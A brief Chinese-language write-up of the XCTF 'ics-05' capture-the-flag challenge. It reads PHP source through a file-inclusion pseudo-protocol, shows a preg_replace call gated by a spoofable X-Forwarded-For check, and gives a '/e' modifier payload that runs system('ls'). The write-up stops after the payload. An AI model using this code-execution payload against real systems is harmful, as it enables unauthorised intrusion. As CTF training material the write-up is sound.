# 攻防世界 ics-05(难度3)php伪协议查看源码

## 思路

- 上来发现下面的页面，然后就不知道咋整了，尝试了很多种方法，这里其实应该想到，page=index，可能存在文件包含，用伪协议读取源码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681978351642-048d6374-8880-478e-b5bf-e48e3953b97f.png#averageHue=%23fcfcfc&clientId=uee83148e-fe68-4&from=paste&height=434&id=u1dcd9e55&originHeight=868&originWidth=1921&originalType=binary&ratio=2&rotation=0&showTitle=false&size=84335&status=done&style=none&taskId=u19392342-0358-428f-8f1d-340b42ea75d&title=&width=960.5)

## wp

- 伪协议读源码

```php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
```

- 发现危险函数preg_replace，当`$pattern`指定模式为`/e`时，`$replacement`会被当做php代码执行

```php
$pattern=/test/e&$replacement=system('ls')&subject=test
```

# 